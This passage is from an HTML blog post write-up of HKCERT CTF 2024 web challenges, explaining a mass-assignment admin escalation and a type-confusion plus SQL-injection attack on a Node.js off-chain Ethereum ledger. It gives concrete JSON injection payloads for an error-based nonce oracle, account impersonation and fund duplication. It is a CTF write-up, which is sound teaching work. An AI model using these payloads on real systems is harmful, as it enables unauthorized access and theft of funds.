+<p>Also, the password for admins is generated by <code>os.urandom(33).hex()</code>, it is impossible for someone to get the password from its digest.</p>
+<p>Instead, in the <code>POST /register/</code> endpoint, it takes the entirety of the user form and populates it to the <code>User</code> model. Although the users are only given the fields for <code>username</code> and <code>password</code>, they could create some additional fields like <code>is_admin</code>. Setting <code>is_admin=1</code> will make the created user an admin. After that, we are able to retrieve the hidden challenge using the challenge management API:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">hkcert24{y0u_c4n_wr1t3_unsp3c1f13d_4t7r1bu73s_t0_th3_us3r_m0d3l}
+</span></span></code></pre></div><h2 id="heading">⚡<a href="#heading" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary-4">Challenge Summary<a href="#challenge-summary-4" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p>The transaction fee in Ethereum is high. People researched in off-chain solutions like Raiden. Introducing ⚡, an open-source project that everyone can audit its source code!</p>
+<p>Register an account and enjoy zero transaction fees (except the first and the last transfers)!</p>
+<p>Attachment: <a href="https://github.com/blackb6a/hkcert-ctf-2024-challenges-public/releases/download/v1.0.0/zap_f9df08d202eed40a94431209ee684a6a.zip"
+   
+   target="_blank" rel="noopener noreferrer" >zap_f9df08d202eed40a94431209ee684a6a.zip</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg></p>
+</blockquote>
+<p>⚡ is a web app implemented in Node.js that moves Ethereum transactions offline, simply maintaining the amounts with a database. There are three related endpoints:</p>
+<ol>
+<li><code>transfer</code> transfers the specified ETH to the designated account,</li>
+<li><code>withdraw</code> sends you the flag if they have 10 ETH in their ⚡ account. No money will be transferred to the mainnet, however.</li>
+<li><code>deposit</code> adds the amount of the transaction from the mainnet to their ⚡ account.</li>
+</ol>
+<p>Initially, there is 1 ETH in the service account for ⚡. The objective is to get 10 ETH in an account owned by the player.</p>
+
+
+<figure>
+  <img src="/images/2025-06-29-hkcert-ctf/zap.png" title="">
+  
+</figure>
+
+<h3 id="solution-4">Solution<a href="#solution-4" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="alert warning">
+  🧩 <strong>What is the intended solution?</strong> Of course, send 10 ETH to the designated account. You can get the flag in no time.
+</div>
+
+<h4 id="the-insecure-getbufferfromhex">The insecure <code>getBufferFromHex</code><a href="#the-insecure-getbufferfromhex" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p><code>getBufferFromHex</code> is used multiple times to handle the user data.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getBufferFromHex</span><span class="p">(</span><span class="nx">hexString</span><span class="p">,</span> <span class="nx">byteLength</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">hexString</span><span class="p">.</span><span class="nx">length</span> <span class="o">!==</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="o">*</span><span class="nx">byteLength</span><span class="p">)</span> <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">regex</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="sb">`0x[0-9a-f]{</span><span class="si">${</span><span class="mi">2</span> <span class="o">*</span> <span class="nx">byteLength</span><span class="si">}</span><span class="sb">}`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">regex</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">hexString</span><span class="p">))</span> <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">hexString</span><span class="si">}</span><span class="sb">`</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="s1">&#39;hex&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">buffer</span><span class="p">.</span><span class="nx">length</span> <span class="o">!==</span> <span class="nx">byteLength</span><span class="p">)</span> <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">buffer</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><code>hexString</code> usually comes from the user input. It seemed that the check is strict, but that there is a critical miss -- <code>hexString</code> might not be a string. For instance, when <code>byteLength == 20</code>, users can send an array of length 42 and still pass the first check.</p>
+<p>Surprisingly, <code>Buffer.from(..., 'hex')</code> would truncate strings silently if the source is not valid hexstrings. For instance,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="s1">&#39;41414141&#39;</span><span class="p">,</span> <span class="s1">&#39;hex&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="s1">&#39;AAAA&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// the trailing 4 is dropped
+</span></span></span><span class="line"><span class="cl"><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="s1">&#39;414141414&#39;</span><span class="p">,</span> <span class="s1">&#39;hex&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="s1">&#39;AAAA&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// the non-hexadecimal characters are truncated 
+</span></span></span><span class="line"><span class="cl"><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="s1">&#39;41414141invalid string414141&#39;</span><span class="p">,</span> <span class="s1">&#39;hex&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="s1">&#39;AAAA&#39;</span>
+</span></span></code></pre></div><p>The below <code>hexString</code> would pass all checks and return <code>AAAA...A</code> as a result. The returned buffer is used to go through more checks like signature validation:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">[</span><span class="s2">&#34;0x4141414141414141414141414141414141414141&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">]</span>
+</span></span></code></pre></div><h4 id="a-sql-injection">A SQL injection<a href="#a-sql-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>It is obvious that the SQL queries for ⚡ are built with format strings, not prepared statements. For example, this is how the queries looked in the <code>POST /login</code> endpoint:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="sb">`SELECT COUNT(*) as count FROM users WHERE account = &#39;</span><span class="si">${</span><span class="nx">account</span><span class="si">}</span><span class="sb">&#39;`</span>
+</span></span><span class="line"><span class="cl"><span class="sb">`INSERT INTO users (account, deposit_nonce, transaction_nonce, balance) VALUES (&#39;</span><span class="si">${</span><span class="nx">account</span><span class="si">}</span><span class="sb">&#39;, &#39;</span><span class="si">${</span><span class="nx">depositNonce</span><span class="si">}</span><span class="sb">&#39;, &#39;</span><span class="si">${</span><span class="nx">transactionNonce</span><span class="si">}</span><span class="sb">&#39;, 0)`</span>
+</span></span><span class="line"><span class="cl"><span class="sb">`INSERT INTO transactions (from_account, to_account, amount, time) VALUES (&#39;</span><span class="si">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">SERVICE_WALLET_ACCOUNT</span><span class="si">}</span><span class="sb">&#39;, &#39;</span><span class="si">${</span><span class="nx">account</span><span class="si">}</span><span class="sb">&#39;, &#39;0&#39;, strftime(&#39;%Y-%m-%dT%H:%M:%SZ&#39;,&#39;now&#39;))`</span>
+</span></span></code></pre></div><p>Here <code>account</code> is an <em>unsantized</em> payload controlled by the player. As discussed above, it is insufficient to validate it with the <code>getBufferFromHex</code> function.</p>
+<div class="alert info">
+  ⛳ <strong>Path to the flag?</strong> To get 10 ETH, we need to steal some funds from the service account and duplicate the funds obtained. Additionally, there are three accounts involved in the solution. Note that only have the private key for the user accounts: service account (<code>0x71f...f7</code>), user account 1 (<code>0xaaa...aa</code>) and user account 2 (<code>0xbbb...bb</code>). The user accounts need not be <code>0xaaa...aa</code> and <code>0xbbb...bb</code>. They are chosen for illustration purposes.
+</div>
+
+<h4 id="exploit-1-stealing-funds-from-the-service-account">Exploit 1: Stealing funds from the service account<a href="#exploit-1-stealing-funds-from-the-service-account" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>To steal funds from the service account, we would want to achieve the below:</p>
+<ol>
+<li>Sign in as the service account. This is impossible, but we can mimic the behaviour.</li>
+<li>Call <code>/transfer</code> with the service account's <code>transaction_nonce</code>.</li>
+</ol>
+<h5 id="leaking-service-accounts-transaction-nonce">Leaking service account's transaction nonce<a href="#leaking-service-accounts-transaction-nonce" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>We can use the below request body and send that to the <code>/login</code> endpoint.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;account&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;0xaaa...aaxx&#39; OR account = &#39;0x71f...f7&#39; AND transaction_nonce LIKE &#39;1337%&#39; -- &#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="err">/*</span> <span class="err">omitted</span> <span class="err">*/</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;signature&#34;</span><span class="p">:</span> <span class="s2">&#34;0x111...11&#34;</span> <span class="c1">// NOTE: we need the correct signature for this to work
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Below is the first SQL query the endpoint executes, prettified:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="k">count</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">WHERE</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0xaaa...aaxx&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0x71f...f7&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">transaction_nonce</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;1337%&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="c1">-- ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+</span></span></span></code></pre></div><p>If the service account's transaction nonce starts with <code>1337</code>, the subsequent queries will be skipped and it will return HTTP 200. Otherwise, it will attempt to insert a new row to the user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="p">(</span><span class="n">account</span><span class="p">,</span><span class="w"> </span><span class="n">deposit_nonce</span><span class="p">,</span><span class="w"> </span><span class="n">transaction_nonce</span><span class="p">,</span><span class="w"> </span><span class="n">balance</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s1">&#39;0xaaa...aaxx&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0x71f...f7&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">transaction_nonce</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span><span class="c1">-- ,,,...,, &#39;ed6...5d&#39;, &#39;fc1...de&#39;, 0)
+</span></span></span></code></pre></div><p>Since the snippet above is an invalid SQL query, it will trigger an exception, causing the endpoint to return an HTTP 500 error. This creates an error-based oracle, allowing us to recover the transaction nonce.</p>
+<h5 id="signing-in-as-the-service-account">Signing in as the service account<a href="#signing-in-as-the-service-account" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>We can send the following payload to the <code>/login</code> endpoint &quot;sign in&quot; as the service account:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;account&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;0xaaa...aaxx&#39; OR account = &#39;0x71f...f7&#39; -- &#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="err">/*</span> <span class="err">omitted</span> <span class="err">*/</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;signature&#34;</span><span class="p">:</span> <span class="s2">&#34;0x111...11&#34;</span> <span class="c1">// NOTE: we need the correct signature for this to work
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>During <code>/login</code>, the signature is validated against <code>0xaaa...aa</code> (the first user account). The session will be set to the above account, which is an array of 42 entries, too.</p>
+<p>The stored account would lead to another injection which makes the SQL retrieve the service account. In this way, we can manipulate the service account without knowing its private key. Knowing the transaction nonce for the service account, we can transfer the funds from the service account to ourselves.</p>
+<h4 id="exploit-2-duplicating-funds">Exploit 2: Duplicating funds<a href="#exploit-2-duplicating-funds" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Now we only have 1 ETH, and we need 10 ETH for the flag. Therefore, we would need some ways to duplicate our funds. To double the current amount for user account 1, we can call the <code>/transfer</code> endpoint with the below payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;to_account&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;0xbbb...bb&#39; or 1 -- &#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="err">/*</span> <span class="err">omitted</span> <span class="err">*/</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;amount&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;signature&#34;</span><span class="p">:</span> <span class="s2">&#34;0x111...11&#34;</span> <span class="c1">// NOTE: we need the correct signature for this to work
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This would transfer 1 ETH to <em>everyone</em> because the below SQL query is made to add funds to the beneficiary account:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SET</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">balance</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1000000000000000000</span><span class="w"> </span><span class="cm">/* 1 ETH = 10^18 wei */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">WHERE</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0xbbb...bb&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">-- ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+</span></span></span></code></pre></div><div class="alert info">
+  💸 <strong>The money gone is gone.</strong> Since there are no database transactions going on, the queries would not revert even if the <code>INSERT INTO transactions ...</code> query is failing.
+</div>
+
+<p>With that, we have 1 ETH in both the two user accounts. We can repeat the process until we have 10 ETH. Eventually, we have the flag:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">hkcert24{h0p3_y0u_pa1d_10_e7h3r_f0r_th3_fl49}
+</span></span></code></pre></div><div class="alert info">
+  🤣 <strong>Fun fact.</strong> The <a href="https://etherscan.io/address/0x71f30b7b29846a5deb9a0913b3c240b61ae027f7#multichain-portfolio"
+   
+   target="_blank" rel="noopener noreferrer" >service wallet account</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg> received 1 USD worth of ETH and 2 USD worth of BNB. But where is my 10 ETH?
+</div>
+
+<div class="alert success">
+  ✨ <strong>Moral of the challenge.</strong> Don't use sanitized data for validation but use the unsanitized data.
+</div>
+
+
+        </div></div>
+
+      
+      <aside class="toc-container">
+        <a href="#" class="toc-title-link">
+          HKCERT CTF 2024 Quals Writeup (III): The Web Challenges
+        </a>
+        <div class="js-toc"></div>
+      </aside>
+      
+
+      
+      <div class="py-3">
+        
+          <a class="btn" href="/posts/2025/2025-06-29-hkcert-ctf-4/">← HKCERT CTF 2024 Quals Writeup (IV): The Reverse Challenges</a>
+        
+
+        
+          <a class="btn float-end" href="/posts/2025/2025-06-29-hkcert-ctf-2/">HKCERT CTF 2024 Quals Writeup (II): Other Crypto Challenges →</a>
+        
+      </div>
+      
+
+    </div>
+  </div>
+
+    </div>
+  </main>
+  <div class="container">
+  <footer class="py-3 my-4 border-top">
+    <p class="text-center text-body-secondary">&copy; 2025 Powered by <em>Hugo</em>. Theme crafted by <em>Mystiz</em> with Bootstrap 5, inspired from <em>Terminal</em>.</p>
+  </footer>
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/katex.min.css"
+  integrity="sha384-Pu5+C18nP5dwykLJOhd2U4Xen7rjScHN/qusop27hdd2drI+lL5KvX7YntvT8yew" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/katex.min.js"
+  integrity="sha384-2B8pfmZZ6JlVoScJm/5hQfNS2TI/6hPqDZInzzPc8oHpN5SgeNOf4LzREO6p5YtZ" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/contrib/auto-render.min.js"
+  integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }], trust: true })"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/@viz-js/viz@3.24.0/dist/viz-global.min.js"></script>
+<script>
+Viz.instance().then(viz => {
+  const unescape = function (s) {
+    const t = s.replace(/&amp;/g, '&')
+    return t.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;/g, '"')
+  }
+
+  document.querySelectorAll('[class=graphviz]').forEach(node => {
+    const source = unescape(node.innerText);
+    console.log(source);
+    const svg = viz.renderSVGElement(source, { engine: 'dot' });
+    console.log(2);
+    node.parentNode.appendChild(svg);
+    node.style.display = 'none';
+  });
+});
+</script>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.js"
+  integrity="sha512-BZUSsJAPNtkd+kdY/bD7hvQKZ5zlgWt++KGy/Pa/5uEJNgs0jZ6JaX6MuclRUanowuxmhb5S3LRPEa3QmrUVfA==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.css"
+  integrity="sha512-/ANQiHMqpRl+E0zEAd250N21OOmJsYbhiJWY0Y8yG0TII47yZn1+gDNobMlf+h/FTyImprLXYgXbX3bCYyq/vg==" crossorigin="anonymous"
+  referrerpolicy="no-referrer" />
+<script type="text/javascript">
+tocbot.init({
+  headingSelector: 'h1, h2, h3, h4',
+  orderedList: false,
+  collapseDepth: 2,
+  headingsOffset: 60,
+  scrollSmoothOffset: -60
+})
+</script>
+
+
+<script>
+  document.querySelectorAll('pre code').forEach(el => {
+    console.log(el)
+    const lang = Array.from(el.classList).find(className => className.startsWith('language-'));
+    if (!lang) return;
+
+    
+    if (lang.startsWith('language-diff-')) {
+      el.classList.add('diff-highlight');
+    }
+  })
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+mermaid.initialize({
+  startOnLoad: true,
+  htmlLabels: true,
+  securityLevel: "loose",
+  theme: 'base',
+  themeVariables: {
+    background: '#22222c',
+    primaryColor: '#33333c',
+    primaryTextColor: '#ffe4e1',
+  }
+});
+</script>
+
+</body>
+</html>
